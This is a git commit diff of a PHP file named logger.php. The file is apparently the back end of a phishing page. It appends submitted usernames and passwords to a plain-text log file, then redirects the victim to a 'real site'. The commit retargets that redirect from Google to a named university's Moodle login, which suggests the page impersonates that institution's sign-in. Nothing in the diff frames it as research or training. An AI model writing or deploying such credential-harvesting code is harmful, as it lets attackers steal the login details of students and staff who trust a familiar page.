0ea3f220b18b4630c45ecb5d29c76df7d753f0a5
Thavrith <164502005+Thavrith-99@users.noreply.github.com>
2025-07-23 14:21:04 +0700

    Done

--- logger.php
+++ logger.php
@@ -3,6 +3,6 @@ $file = fopen("log.txt", "a");
 fwrite($file, "Username: " . $_POST['username'] . "\n");
 fwrite($file, "Password: " . $_POST['password'] . "\n\n");
 fclose($file);
-header('Location: https://www.google.com'); // redirect to real site
+header('Location: https://moodle.ccun.edu.kh'); // redirect to real site
 exit();
 ?>
